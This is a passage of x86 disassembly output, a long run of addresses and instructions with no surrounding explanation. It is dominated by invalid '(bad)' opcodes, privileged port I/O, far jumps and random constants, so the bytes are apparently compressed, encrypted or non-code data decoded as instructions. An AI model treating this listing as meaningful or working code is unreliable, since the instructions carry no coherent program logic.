  41dd7d:	jecxz  0x41dd67
  41dd7f:	iret   
  41dd80:	fisttp WORD PTR [edi+esi*1]
  41dd83:	jecxz  0x41dd2f
  41dd85:	jnp    0x41ddbc
  41dd87:	imul   esi,DWORD PTR [esi+0x470676a7],0xde71295c
  41dd91:	popa   
  41dd92:	fst    QWORD PTR [esi]
  41dd94:	stos   DWORD PTR es:[edi],eax
  41dd95:	add    BYTE PTR gs:[edi],dl
  41dd98:	mov    ch,0xd7
  41dd9a:	sbb    edx,DWORD PTR [edi+0x7]
  41dd9d:	sbb    esp,ecx
  41dd9f:	xor    al,0x43
  41dda1:	out    dx,al
  41dda2:	fcmovbe st,st(4)
  41dda4:	jecxz  0x41dda1
  41dda6:	sti    
  41dda7:	cwde   
  41dda8:	mov    dl,0x8b
  41ddaa:	sub    DWORD PTR [eax+0x58],0xffffffd2
  41ddae:	jb     0x41dd5b
  41ddb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddb1:	(bad)  
  41ddb2:	test   DWORD PTR [esi],0xb36137bd
  41ddb8:	sub    BYTE PTR [esi-0x2cc43a48],0x94
  41ddbf:	mov    bh,0x7a
  41ddc1:	stos   BYTE PTR es:[edi],al
  41ddc2:	lock sti 
  41ddc4:	lock mov ah,dh
  41ddc7:	and    al,0x2f
  41ddc9:	inc    edi
  41ddca:	(bad)  
  41ddcb:	pop    esi
  41ddcc:	jg     0x41dd7c
  41ddce:	and    al,0x41
  41ddd0:	lahf   
  41ddd1:	scas   eax,DWORD PTR es:[edi]
  41ddd2:	push   ds
  41ddd3:	stos   BYTE PTR es:[edi],al
  41ddd4:	pop    ecx
  41ddd5:	call   0x99ec:0x6a5a8342
  41dddc:	lea    edi,[esi+0x13]
  41dddf:	test   BYTE PTR [esi-0x3f4ce440],bl
  41dde5:	xor    BYTE PTR [eax-0x6599fc5c],ah
  41ddeb:	loop   0x41dd71
  41dded:	mov    esp,0xbac894a4
  41ddf2:	pop    edx
  41ddf3:	xor    BYTE PTR [ebx],ah
  41ddf5:	in     al,0xf7
  41ddf7:	icebp  
  41ddf8:	aam    0xff
  41ddfa:	(bad)  
  41ddfb:	or     al,0xd1
  41ddfd:	ror    ebx,cl
  41ddff:	xchg   ebp,eax
  41de00:	add    DWORD PTR [ecx-0x8],edi
  41de03:	pop    ds
  41de04:	(bad)  
  41de05:	ficom  DWORD PTR [ebx]
  41de07:	cmp    BYTE PTR [eax+ecx*2+0x2cc1e159],0x1
  41de0f:	loopne 0x41dde2
  41de11:	ss scas al,BYTE PTR es:[edi]
  41de13:	fcom   DWORD PTR [eax-0x31945f9]
  41de19:	mov    edi,DWORD PTR [ecx+0x18]
  41de1c:	mov    edi,0xbd1e32d6
  41de21:	data16 repz jns 0x41ddf6
  41de25:	pop    esi
  41de26:	sbb    DWORD PTR [ebx+0x4822e7fe],edi
  41de2c:	push   ecx
  41de2d:	sbb    DWORD PTR [edi-0x4eb9cbac],esi
  41de33:	or     ecx,eax
  41de35:	add    BYTE PTR [esi+0x45290360],dl
  41de3b:	jge    0x41ddd5
  41de3d:	pmulhuw mm0,mm7
  41de40:	fcomp  DWORD PTR [edx]
  41de42:	mov    ebp,0xd75f05df
  41de47:	sbb    DWORD PTR [esi-0x33],0xeeac2ad2
  41de4e:	mov    eax,0xb014e2f6
  41de53:	push   0xffffffbc
  41de55:	loopne 0x41de68
  41de57:	sub    dl,BYTE PTR [edi]
  41de59:	pop    edx
  41de5a:	rcl    edi,1
  41de5c:	xchg   esi,eax
  41de5d:	xchg   ecx,eax
  41de5e:	jbe    0x41dea7
  41de60:	sub    ebp,DWORD PTR [eax+0x23]
  41de63:	aam    0x94
  41de65:	pushf  
  41de66:	int    0xd3
  41de68:	mov    ah,BYTE PTR [ebx+edx*1+0x7fbbbb79]
  41de6f:	add    ch,BYTE PTR [ebx]
  41de71:	aas    
  41de72:	iret   
  41de73:	cmp    esp,eax
  41de75:	(bad)  [ecx+0x4bf4895]
  41de7b:	jne    0x41de46
  41de7d:	iret   
  41de7e:	imul   esp,DWORD PTR [eax-0x7d],0x549b7732
  41de85:	scas   eax,DWORD PTR es:[edi]
  41de86:	xchg   edi,eax
  41de87:	inc    ebp
  41de88:	sbb    dl,BYTE PTR [esp+eax*2-0x286c5e58]
  41de8f:	jo     0x41de1c
  41de91:	sub    eax,0xf33b7c57
  41de96:	push   DWORD PTR es:[ebx+0x6a9af9c4]
  41de9d:	cmp    al,0x2a
  41de9f:	fnsave [esi-0x12c30dfa]
  41dea5:	clc    
  41dea6:	sub    eax,DWORD PTR [ebp+0x16b1f1b3]
  41deac:	das    
  41dead:	sub    bl,BYTE PTR [ebx]
  41deaf:	push   0x3
  41deb1:	ss cmp al,0x77
  41deb4:	jmp    0x40c5257e
  41deb9:	ja     0x41de46
  41debb:	dec    ecx
  41debc:	jbe    0x41de5c
  41debe:	lock mov eax,ds:0xe4a26314
  41dec4:	jmp    0x41de75
  41dec6:	dec    edx
  41dec7:	xchg   ebp,eax
  41dec8:	dec    ebp
  41dec9:	imul   BYTE PTR [esi]
  41decb:	aaa    
  41decc:	cmp    DWORD PTR [ecx-0x6],0xffffffa0
  41ded0:	pusha  
  41ded1:	jns    0x41dece
  41ded3:	fstp   QWORD PTR [edi]
  41ded5:	fisubr WORD PTR [ecx-0x14]
  41ded8:	test   bh,dh
  41deda:	or     eax,DWORD PTR [ebp-0x3b]
  41dedd:	xor    al,0x10
  41dedf:	stc    
  41dee0:	dec    esi
  41dee1:	xchg   edi,edi
  41dee3:	xchg   ecx,eax
  41dee4:	nop
  41dee5:	jae    0x41de86
  41dee7:	jmp    0x41ded7
  41dee9:	mov    dl,0xca
  41deeb:	and    edx,DWORD PTR [edi]
  41deed:	push   ebp
  41deee:	test   eax,0x9e60ef5b
  41def3:	clc    
  41def4:	mov    edx,0x9dffb463
  41def9:	lods   al,BYTE PTR ds:[esi]
  41defa:	ja     0x41deff
  41defc:	push   es
  41defd:	retf   
  41defe:	loope  0x41df07
  41df00:	xchg   ebx,eax
  41df01:	popa   
  41df02:	(bad)  
  41df03:	xor    al,0xac
  41df05:	xor    BYTE PTR [ebx-0x47c0520b],bl
  41df0b:	repnz xchg ebp,eax
  41df0d:	ret    0xd9c7
  41df10:	mov    ebx,0xbc47166a
  41df15:	mov    DWORD PTR [ebp+esi*4-0x6b139cd4],ebp
  41df1c:	js     0x41df00
  41df1e:	in     eax,0x71
  41df20:	scas   eax,DWORD PTR es:[edi]
  41df21:	dec    edx
  41df22:	sbb    al,0xf7
  41df24:	and    BYTE PTR [ebp+0x78aec9d0],dl
  41df2a:	or     BYTE PTR [ebp-0x3c871ebd],dh
  41df30:	aam    0xd2
  41df32:	xor    bh,BYTE PTR [eax-0x7cd4efa4]
  41df38:	xor    ebp,edx
  41df3a:	fldcw  WORD PTR [ebp-0x7]
  41df3d:	(bad)  
  41df3f:	inc    esi
  41df40:	lock test al,0x16
  41df43:	xchg   ebx,eax
  41df44:	jmp    0xfed0:0x4d1904e3
  41df4b:	add    edx,ecx
  41df4d:	or     DWORD PTR [esi+edi*4+0x651508d2],0x8a1c3946
  41df58:	fcomi  st,st(4)
  41df5a:	fcmove st,st(6)
  41df5c:	test   DWORD PTR [eax],edi
  41df5e:	xchg   DWORD PTR [esi-0x36195b5],edi
  41df64:	aad    0x28
  41df66:	(bad)  
  41df67:	mov    ebp,0x3c9b08c2
  41df6c:	lods   al,BYTE PTR ds:[esi]
  41df6d:	popa   
  41df6e:	outs   dx,DWORD PTR ds:[esi]
  41df6f:	pop    edi
  41df70:	loope  0x41df6c
  41df72:	pop    ds
  41df73:	cmp    ebx,DWORD PTR [ebp-0x1a2a54f5]
  41df79:	mov    al,0xd4
  41df7b:	rcl    ebx,0x77
  41df7e:	push   esi
  41df7f:	iret   
  41df80:	push   edx
  41df81:	call   FWORD PTR [ecx+0x39110f1b]
  41df87:	push   esp
  41df88:	nop
  41df89:	mov    ah,0x9
  41df8b:	in     eax,dx
  41df8c:	mov    al,ds:0x5bc85e20
  41df91:	mov    ch,bl
  41df93:	fldenv [ebx-0x5]
  41df96:	daa    
  41df97:	cmp    ebp,DWORD PTR [eax+ebp*2+0x3d]
  41df9b:	(bad)  
  41df9d:	leave  
  41df9e:	pop    esp
  41df9f:	and    DWORD PTR [esi+0x4b],esi
  41dfa2:	rcl    DWORD PTR [bx+0x1b],0x60
  41dfa7:	xchg   ecx,eax
  41dfa8:	aas    
  41dfa9:	mov    ch,0xc0
  41dfab:	mov    al,0xb0
  41dfad:	mov    ecx,0xef901a74
  41dfb2:	jb     0x41dfc1
  41dfb4:	xlat   BYTE PTR ds:[ebx]
  41dfb5:	sbb    al,0x92
  41dfb7:	xor    eax,0xabeae5c4
  41dfbc:	scas   eax,DWORD PTR es:[edi]
  41dfbd:	outs   dx,DWORD PTR ds:[esi]
  41dfbe:	int    0x93
  41dfc0:	repnz in eax,dx
  41dfc2:	ja     0x41dfbe
  41dfc4:	(bad)  
  41dfc5:	jnp    0x41dfbe
  41dfc7:	ins    DWORD PTR es:[edi],dx
  41dfc8:	or     BYTE PTR [esi+0x15],0xc9
  41dfcc:	je     0x41df79
  41dfce:	jo     0x41df6c
  41dfd0:	lock push esi
  41dfd2:	xchg   ebp,eax
  41dfd3:	dec    ecx
  41dfd4:	mov    bl,0x9c
  41dfd6:	test   bh,ch
  41dfd8:	cmp    ah,0xfd
  41dfdb:	jo     0x41dfb1
  41dfdd:	adc    DWORD PTR [edx],edi
  41dfdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfe0:	adc    eax,0xa1fd5d86
  41dfe5:	inc    ebp
  41dfe6:	int    0x8a
  41dfe8:	and    al,0x75
  41dfea:	pop    eax
  41dfeb:	jp     0x41df9b
  41dfed:	xor    cl,BYTE PTR ds:0xe29ddeca
  41dff3:	mov    bh,0x1d
  41dff5:	lds    ecx,FWORD PTR [ebx-0x6c1d85cc]
  41dffb:	jge    0x41df81
  41dffd:	rcr    DWORD PTR [esi-0x3f],0xb8
  41e001:	je     0x41e027
  41e003:	(bad)  
  41e005:	xchg   dl,al
  41e007:	mov    ecx,0xcf970098
  41e00c:	test   BYTE PTR [ecx+0x1f],bl
  41e00f:	mov    ebx,0x697cc0d1
  41e014:	cmp    al,0x88
  41e016:	mov    ds:0xca8c4fd7,eax
  41e01b:	mov    ch,0x6b
  41e01d:	mov    edi,0x27b70830
  41e022:	push   eax
  41e023:	shr    DWORD PTR [esi-0x57],1
  41e026:	inc    esp
  41e027:	rcl    esi,0xd5
  41e02a:	push   ds
  41e02b:	and    eax,0x6a97ae56
  41e030:	ror    DWORD PTR [ecx-0x6b24b84e],cl
  41e036:	dec    esp
  41e037:	pop    ss
  41e038:	data16 in al,0x5b
  41e03b:	int3   
  41e03c:	dec    ebx
  41e03d:	mov    dh,0xf3
  41e03f:	adc    ah,BYTE PTR [ebx+0x74]
  41e042:	xchg   ecx,eax
  41e043:	leave  
  41e044:	inc    edi
  41e045:	(bad)  
  41e046:	jg     0x41e052
  41e048:	leave  
  41e049:	adc    edx,DWORD PTR [ebp-0x1c]
  41e04c:	popa   
  41e04d:	sub    BYTE PTR [ebp+0x4dbbd0f5],0x73
  41e054:	imul   edx,DWORD PTR [edi+0x3],0x46
  41e058:	ss mov eax,0x2742436e
  41e05e:	out    dx,al
  41e05f:	mov    dl,0x4
  41e061:	add    al,0xd1
  41e063:	lea    ecx,[ecx]
  41e065:	mov    al,ds:0x16ad9f97
  41e06a:	adc    eax,0x1b0df06c
  41e06f:	int    0xac
  41e071:	xchg   edx,eax
  41e072:	lds    edx,FWORD PTR [esi+0x36c40eb0]
  41e078:	dec    eax
  41e079:	adc    esp,edi
  41e07b:	jmp    0x2b3b:0x644d13e3
  41e082:	sub    esp,ecx
  41e084:	les    ebp,FWORD PTR [edi-0x31]
  41e087:	mov    bh,0xe4
  41e089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e08a:	inc    esp
  41e08b:	adc    BYTE PTR [ecx],dl
  41e08d:	aas    
  41e08e:	icebp  
  41e08f:	sar    DWORD PTR [edi+ecx*4],0x27
  41e093:	into   
  41e094:	addr16 out 0x4a,al
  41e097:	mov    eax,ds:0x20324fdd
  41e09c:	je     0x41e0d6
  41e09e:	ror    DWORD PTR [eax],1
  41e0a0:	and    al,0xad
  41e0a2:	call   0xfc87982b
  41e0a7:	mov    ch,0x3a
  41e0a9:	mov    esp,edi
  41e0ab:	push   ebx
  41e0ac:	ret    0x3434
  41e0af:	pop    edx
  41e0b0:	mov    ebp,0x9a286890
  41e0b5:	out    0xc8,eax
  41e0b7:	mov    esp,DWORD PTR [edx+esi*1-0x231a6f04]
  41e0be:	(bad)  [edi-0x35d48dae]
  41e0c4:	add    eax,0xdbef8409
  41e0c9:	ins    DWORD PTR es:[edi],dx
  41e0ca:	repz into 
  41e0cc:	lahf   
  41e0cd:	mov    DWORD PTR [edi+edx*8],eax
  41e0d0:	jle    0x41e141
  41e0d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0d3:	dec    eax
  41e0d4:	mov    BYTE PTR fs:[eax+0x5a56b8d0],bl
  41e0db:	rcr    BYTE PTR [eax],1
  41e0dd:	mov    WORD PTR [ebx-0x31],cs
  41e0e0:	mov    dh,0x4c
  41e0e2:	hlt    
  41e0e3:	test   ch,dl
  41e0e5:	clc    
  41e0e6:	push   0x1f
  41e0e8:	outs   dx,DWORD PTR ds:[esi]
  41e0e9:	jnp    0x41e097
  41e0eb:	cmp    ecx,edi
  41e0ed:	repnz push eax
  41e0ef:	jl     0x41e0b5
  41e0f1:	lea    eax,[edx+0x6be4770d]
  41e0f7:	in     eax,0xcd
  41e0f9:	mov    ah,0x4
  41e0fb:	test   al,0xb8
  41e0fd:	or     DWORD PTR [ebx+0x6b16a04f],edx
  41e103:	mov    ebx,0xe359bc7f
  41e108:	inc    ebp
  41e109:	add    BYTE PTR [esi+0x1a],dh
  41e10c:	les    edi,FWORD PTR [eax]
  41e10e:	xchg   esi,eax
  41e10f:	and    esp,edx
  41e111:	rol    BYTE PTR [edx-0x2367ad6e],1
  41e117:	(bad)  
  41e118:	adc    cl,dl
  41e11a:	(bad)  
  41e11b:	jecxz  0x41e122
  41e11d:	or     al,0x89
  41e11f:	ss sub esp,eax
  41e122:	push   ecx
  41e123:	mov    al,0xb2
  41e125:	mov    ecx,0x1ca88cc4
  41e12a:	xor    bh,dl
  41e12c:	push   esi
  41e12d:	dec    esi
  41e12e:	push   ebp
  41e12f:	push   0xffffffd6
  41e131:	mov    cl,0x1c
  41e133:	addr16 xchg ecx,eax
  41e135:	cmp    eax,0x9ac6dbd9
  41e13a:	fsub   QWORD PTR [ecx]
  41e13c:	mov    esp,DWORD PTR [eax-0x77a8232c]
  41e142:	nop
  41e143:	fs pop ds
  41e145:	mov    ebx,0xc85f4e9c
  41e14a:	imul   edx,DWORD PTR [edx],0xffffffca
  41e14d:	xor    ch,BYTE PTR [edx]
  41e14f:	jae    0x41e1cf
  41e151:	mov    dl,0x7f
  41e153:	rcr    BYTE PTR [esi-0x70],1
  41e156:	mov    edi,0x39b6998e
  41e15b:	shl    BYTE PTR [ebx+0x6d],0x51
  41e15f:	pop    esp
  41e160:	mov    ecx,0x7f33b740
  41e165:	pusha  
  41e166:	jno    0x41e1d6
  41e168:	jecxz  0x41e1cc
  41e16a:	sbb    ebx,eax
  41e16c:	mov    dl,cl
  41e16e:	lds    eax,FWORD PTR [edi]
  41e170:	or     eax,0xd05ff4f6
  41e175:	pop    esi
  41e176:	dec    ecx
  41e177:	add    al,0xe7
  41e179:	ror    BYTE PTR [eax-0x66],1
  41e17c:	fwait
  41e17d:	jecxz  0x41e1ee
  41e17f:	ss push ebx
  41e181:	dec    edi
  41e182:	js     0x41e115
  41e184:	xor    BYTE PTR [edi+0x4e],ch
  41e187:	ror    DWORD PTR [ebp+0x2b2c3f59],cl
  41e18d:	and    ebp,DWORD PTR [edi-0x15094f8f]
  41e193:	cmp    dh,BYTE PTR [esi-0x15db5273]
  41e199:	or     eax,0x3b8e62b0
  41e19e:	fstp   QWORD PTR [edx-0x381652ae]
  41e1a4:	gs in  eax,0xd
  41e1a7:	dec    ecx
  41e1a8:	add    dl,BYTE PTR [eax-0x7c]
  41e1ab:	mov    ss,WORD PTR [esp+ebx*2]
  41e1ae:	inc    edi
  41e1af:	sub    eax,eax
  41e1b1:	or     cl,BYTE PTR [ebp-0x32]
  41e1b4:	jno    0x41e1d1
  41e1b6:	push   es
  41e1b7:	enter  0xd350,0xdf
  41e1bb:	(bad)  
  41e1bc:	mov    al,0x97
  41e1be:	out    dx,eax
  41e1bf:	icebp  
  41e1c0:	xor    eax,0xaf7bf407
  41e1c5:	shl    edx,cl
  41e1c7:	pop    esi
  41e1c8:	aad    0x5f
  41e1ca:	imul   ecx,DWORD PTR [ebp+0x5d383078],0x1443704e
  41e1d4:	in     eax,0x60
  41e1d6:	pop    eax
  41e1d7:	out    0xe7,al
  41e1d9:	and    BYTE PTR [ecx-0x62],ch
  41e1dc:	cmp    eax,0xe5f0b86c
  41e1e1:	push   ebx
  41e1e2:	(bad)  
  41e1e4:	shl    BYTE PTR [ecx+0x23d73720],1
  41e1ea:	sti    
  41e1eb:	out    0x2b,al
  41e1ed:	iret   
  41e1ee:	call   0xd7a8f163
  41e1f3:	ds std 
  41e1f5:	mov    bh,0x3b
  41e1f7:	into   
  41e1f8:	pop    esi
  41e1f9:	jno    0x41e21c
  41e1fb:	add    al,0x35
  41e1fd:	xchg   ebx,eax
  41e1fe:	push   esi
  41e1ff:	(bad)  
  41e200:	cmp    ch,BYTE PTR [edi+esi*1+0x20]
  41e204:	stos   DWORD PTR es:[edi],eax
  41e205:	fistp  WORD PTR [edx+0x2b]
  41e208:	out    dx,eax
  41e209:	xlat   BYTE PTR ds:[ebx]
  41e20a:	adc    ch,BYTE PTR [ecx-0x11]
  41e20d:	xchg   esp,eax
  41e20e:	es aad 0x99
  41e211:	push   0xdce08f5b
  41e216:	sbb    eax,0x54568c11
  41e21b:	add    BYTE PTR [eax-0x568b198],dl
  41e221:	lock push ebx
  41e223:	out    dx,al
  41e224:	sub    BYTE PTR [esi],0x84
  41e227:	out    dx,al
  41e228:	pop    DWORD PTR [ebx+0x1c5e63c7]
  41e22e:	cs cld 
  41e230:	xchg   BYTE PTR [edx-0x27bc55cd],dh
  41e236:	popw   es
  41e238:	inc    ebx
  41e239:	pusha  
  41e23a:	scas   eax,DWORD PTR es:[edi]
  41e23b:	iret   
  41e23c:	test   BYTE PTR [edi+0x1b],bh
  41e23f:	pop    ecx
  41e240:	inc    eax
  41e241:	sub    eax,DWORD PTR [ebx+esi*8-0x650fb09b]
  41e248:	mov    ecx,0x1c4fcdb2
  41e24d:	dec    ecx
  41e24e:	jp     0x41e2cb
  41e250:	cli    
  41e251:	bound  ebx,QWORD PTR [ebx*4+0x702e3536]
  41e258:	shr    BYTE PTR [esi],1
  41e25a:	stc    
  41e25b:	out    0x80,al
  41e25d:	sub    ch,bl
  41e25f:	push   esp
  41e260:	pop    ss
  41e261:	stc    
  41e262:	push   cs
  41e263:	xor    DWORD PTR [esi+0x16],edi
  41e266:	push   es
  41e267:	inc    BYTE PTR [edx]
  41e269:	shr    DWORD PTR [eax-0x4f5c700e],1
  41e26f:	outs   dx,BYTE PTR ds:[esi]
  41e270:	cdq    
  41e271:	or     eax,0xdac06646
  41e276:	fwait
  41e277:	lods   al,BYTE PTR ds:[esi]
  41e278:	aam    0x75
  41e27a:	cdq    
  41e27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e27c:	push   edx
  41e27d:	jmp    0x9279:0xf4935eea
  41e284:	and    eax,0x2f423321
  41e289:	dec    ecx
  41e28a:	jno    0x41e282
  41e28c:	push   es
  41e28d:	pop    ebx
  41e28e:	je     0x41e267
  41e290:	mov    ah,0x22
  41e292:	(bad)  
  41e293:	aam    0x2d
  41e295:	xchg   ecx,eax
  41e296:	dec    ebx
  41e297:	push   ebp
  41e298:	mov    edx,0x9b7f31da
  41e29d:	lock jno 0x41e2b1
  41e2a0:	aam    0xd2
  41e2a2:	mov    esi,0xba091b78
  41e2a7:	rcr    BYTE PTR [esi+0x157870ae],0x30
  41e2ae:	pop    esp
  41e2af:	(bad)  
  41e2b0:	scas   eax,DWORD PTR es:[edi]
  41e2b1:	push   ebp
  41e2b2:	cmp    DWORD PTR [esi-0x4bade038],ebp
  41e2b8:	mov    cs,WORD PTR [edi-0x4b]
  41e2bb:	add    bh,bl
  41e2bd:	ret    0xbe15
  41e2c0:	(bad)  
  41e2c1:	jmp    0x431e:0x17863b7f
  41e2c8:	xchg   ecx,eax
  41e2c9:	add    eax,0x612a5893
  41e2ce:	jno    0x41e2e8
  41e2d0:	rol    BYTE PTR [edi-0x5b],1
  41e2d3:	fs cmp al,0x1e
  41e2d6:	pusha  
  41e2d7:	call   0xae345d40
  41e2dc:	mov    cl,0xc6
  41e2de:	adc    al,0xa2
  41e2e0:	and    al,0x35
  41e2e2:	mov    cs,WORD PTR [edi+edx*1-0x482ce2e2]
  41e2e9:	adc    bh,BYTE PTR [ebx+0x37]
  41e2ec:	and    al,0x92
  41e2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ef:	lds    ecx,FWORD PTR [edx-0x52097278]
  41e2f5:	xchg   edi,eax
  41e2f6:	test   DWORD PTR [edx],ecx
  41e2f8:	ss adc ebp,ebp
  41e2fb:	fist   DWORD PTR [edx+0x54a04a5b]
  41e301:	dec    esi
  41e302:	jecxz  0x41e383
  41e304:	sub    ch,bh
  41e306:	jecxz  0x41e299
  41e308:	dec    ecx
  41e309:	cmp    eax,edx
  41e30b:	(bad)  
  41e30c:	dec    edi
  41e30d:	neg    BYTE PTR [ebp+0x21]
  41e310:	out    0xc5,al
  41e312:	mov    bl,0xec
  41e314:	push   0x64cf7f4e
  41e319:	add    BYTE PTR [ebp+ebx*8-0x3],bl
  41e31d:	mov    WORD PTR [esi+0xd09589d],es
  41e323:	sbb    al,0x83
  41e325:	mov    eax,ds:0x6fb6f0bc
  41e32a:	aam    0xbc
  41e32c:	add    ch,BYTE PTR [edi+0x22]
  41e32f:	inc    eax
  41e330:	xor    al,0x48
  41e332:	sbb    cl,BYTE PTR [ebx+0x600d8341]
  41e338:	or     al,0xc4
  41e33a:	adc    edx,DWORD PTR [ecx-0x2c]
  41e33d:	repnz fistp DWORD PTR [edx+0x53ea08e3]
  41e344:	hlt    
  41e345:	add    eax,0xfdd7d3ef
  41e34a:	jecxz  0x41e396
  41e34c:	mov    es,WORD PTR [ecx+eiz*8+0x4513cdc4]
  41e353:	inc    edx
  41e354:	dec    esi
  41e355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e356:	dec    eax
  41e357:	jae    0x41e2e0
  41e359:	data16 jp 0x41e34f
  41e35c:	je     0x41e3a1
  41e35e:	xchg   esi,eax
  41e35f:	dec    esp
  41e360:	arpl   sp,bp
  41e362:	xor    ch,dl
  41e364:	ror    BYTE PTR [ecx-0x4e],0x9b
  41e368:	xchg   DWORD PTR [ecx-0x54d7d259],eax
  41e36e:	adc    bl,BYTE PTR [ecx]
  41e370:	outs   dx,BYTE PTR ds:[esi]
  41e371:	cdq    
  41e372:	mov    dh,0xe7
  41e374:	push   ds
  41e375:	bound  esi,QWORD PTR [esi]
  41e377:	mov    dl,bh
  41e379:	inc    esp
  41e37a:	std    
  41e37b:	out    0x8f,al
  41e37d:	(bad)  [ebx]
  41e37f:	jl     0x41e3e8
  41e381:	inc    ecx
  41e382:	mul    DWORD PTR [edx+0x47ba2105]
  41e388:	aad    0xbe
  41e38a:	fidivr DWORD PTR [ebx]
  41e38c:	ficom  WORD PTR [ebx]
  41e38e:	dec    ecx
  41e38f:	xchg   edi,eax
  41e390:	test   eax,0xf4702206
  41e395:	popf   
  41e396:	dec    edx
  41e397:	iret   
  41e398:	jo     0x41e3bb
  41e39a:	xor    al,0x99
  41e39c:	ficom  WORD PTR [ebp+0x21d2a9a7]
  41e3a2:	cmc    
  41e3a3:	or     ecx,ebx
  41e3a5:	sti    
  41e3a6:	mov    ebp,edx
  41e3a8:	fadd   DWORD PTR [ecx-0xe]
  41e3ab:	les    edx,FWORD PTR [eax+edi*4+0x27bfc78b]
  41e3b2:	pop    eax
  41e3b3:	test   BYTE PTR [ecx],0xa
  41e3b6:	retf   0x7fef
  41e3b9:	stos   DWORD PTR es:[edi],eax
  41e3ba:	cmp    edi,esi
  41e3bc:	fcmovnu st,st(0)
  41e3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3bf:	push   ebx
  41e3c0:	inc    eax
  41e3c1:	inc    ebp
  41e3c2:	mov    dl,0xca
  41e3c4:	xor    al,0x3c
  41e3c6:	leave  
  41e3c7:	push   eax
  41e3c8:	outs   dx,BYTE PTR ds:[esi]
  41e3c9:	cmp    DWORD PTR [ebx+0x71caf7b9],ebx
  41e3cf:	shr    DWORD PTR [edx+0x7c],1
  41e3d2:	fimul  DWORD PTR [eax+eiz*1]
  41e3d5:	xchg   DWORD PTR [ecx+0x6affb001],ebp
  41e3db:	retf   
  41e3dc:	lock cwde 
  41e3de:	and    eax,0xf5703b74
  41e3e3:	add    al,0x50
  41e3e5:	outs   dx,BYTE PTR ds:[esi]
  41e3e6:	fisttp QWORD PTR [esi]
  41e3e8:	push   edx
  41e3e9:	xor    al,0x89
  41e3eb:	ja     0x41e3bb
  41e3ed:	adc    ebp,DWORD PTR [eax-0xe]
  41e3f0:	je     0x41e38b
  41e3f2:	adc    dl,BYTE PTR [ebx+0x64]
  41e3f5:	shl    BYTE PTR [ebp+0x30],0xed
  41e3f9:	out    dx,al
  41e3fa:	push   ebp
  41e3fb:	pop    es
  41e3fc:	ja     0x41e410
  41e3fe:	mov    edx,0xf0a30d33
  41e403:	inc    ebp
  41e404:	jae    0x41e38e
  41e406:	jl     0x41e448
  41e408:	fs mov al,0x4
  41e40b:	pop    edi
  41e40c:	and    ebp,DWORD PTR es:[eax-0x4bd749ca]
  41e413:	push   esp
  41e414:	pop    ecx
  41e415:	in     eax,0x9b
  41e417:	loopne 0x41e400
  41e419:	in     al,0x81
  41e41b:	jnp    0x41e3bc
  41e41d:	leave  
  41e41e:	inc    ecx
  41e41f:	add    BYTE PTR [edx],0x99
  41e422:	inc    edi
  41e423:	adc    ebp,DWORD PTR ds:0xeac7b42c
  41e429:	push   ecx
  41e42a:	mov    DWORD PTR gs:[edx],ecx
  41e42d:	or     DWORD PTR [edx+0x6ea51f9d],ebx
  41e433:	mov    ch,0x78
  41e435:	adc    dh,BYTE PTR [ebx+ebx*4]
  41e438:	jg     0x41e3c1
  41e43a:	std    
  41e43b:	mov    dl,0x6
  41e43d:	stos   DWORD PTR es:[edi],eax
  41e43e:	jmp    0x41e448
  41e440:	inc    ecx
  41e441:	sbb    eax,0x9c21f052
  41e446:	push   es
  41e447:	dec    ebx
  41e448:	mov    dl,0x1c
  41e44a:	fcom   QWORD PTR [eax+ebp*1-0x7e859d1]
  41e451:	jbe    0x41e40a
  41e453:	cwde   
  41e454:	xor    edi,DWORD PTR [edx+0x29408553]
  41e45a:	fcmove st,st(5)
  41e45c:	ins    DWORD PTR es:[edi],dx
  41e45d:	stc    
  41e45e:	les    esp,FWORD PTR ds:0x114369d8
  41e464:	or     dl,ah
  41e466:	out    0x1c,eax
  41e468:	fstp   DWORD PTR [ebp-0x6903c792]
  41e46e:	adc    ebx,DWORD PTR [ebx+0x52e66e30]
  41e474:	sub    al,ah
  41e476:	pop    ecx
  41e477:	retf   
  41e478:	push   edi
  41e479:	gs pop ebx
  41e47b:	dec    esi
  41e47c:	dec    esp
  41e47d:	(bad)  
  41e47e:	not    cl
  41e480:	shr    BYTE PTR ss:[di-0x6e3e],1
  41e486:	xor    eax,0x716d8d7e
  41e48b:	jno    0x41e4cc
  41e48d:	or     BYTE PTR ds:0x19eb1072,bl
  41e493:	daa    
  41e494:	retf   
  41e495:	adc    eax,0x5785a250
  41e49a:	test   DWORD PTR [ebp+0x3b533e94],edi
  41e4a0:	das    
  41e4a1:	repz rcl DWORD PTR [ecx],0xe4
  41e4a5:	sub    BYTE PTR [ebx-0x58d577dc],0x14
  41e4ac:	dec    edx
  41e4ad:	les    ecx,FWORD PTR [eax]
  41e4af:	xchg   ecx,eax
  41e4b0:	or     ch,BYTE PTR [edi+0x54]
  41e4b3:	xor    eax,0x7ecddfbc
  41e4b8:	and    BYTE PTR [eax+0xc],ah
  41e4bb:	cmp    BYTE PTR [ecx+0x15f7714c],0xe0
  41e4c2:	lock dec ebp
  41e4c4:	sbb    DWORD PTR [edi-0x72d978b4],ecx
  41e4ca:	pop    edi
  41e4cb:	xchg   edi,eax
  41e4cc:	dec    ebp
  41e4cd:	pop    ss
  41e4ce:	mov    bl,0x4a
  41e4d0:	mov    al,0xfc
  41e4d2:	jb     0x41e4a8
  41e4d4:	sti    
  41e4d5:	pop    ecx
  41e4d6:	add    eax,0x1ded2b38
  41e4db:	in     eax,dx
  41e4dc:	cmp    eax,0x1f251e94
  41e4e1:	dec    ebx
  41e4e2:	daa    
  41e4e3:	and    DWORD PTR [edi-0x48],edi
  41e4e6:	es loopne 0x41e4d0
  41e4e9:	mov    bh,BYTE PTR [ecx+0x6645f1c]
  41e4ef:	call   edx
  41e4f1:	dec    edx
  41e4f2:	rcr    DWORD PTR [esi+0x6f0cecc7],0xf8
  41e4f9:	jmp    FWORD PTR [ecx-0x1d27a469]
  41e4ff:	cmp    al,BYTE PTR [edx+0x2c]
  41e502:	sub    dh,BYTE PTR [eax+0x0]
  41e505:	hlt    
  41e506:	iret   
  41e507:	pop    ss
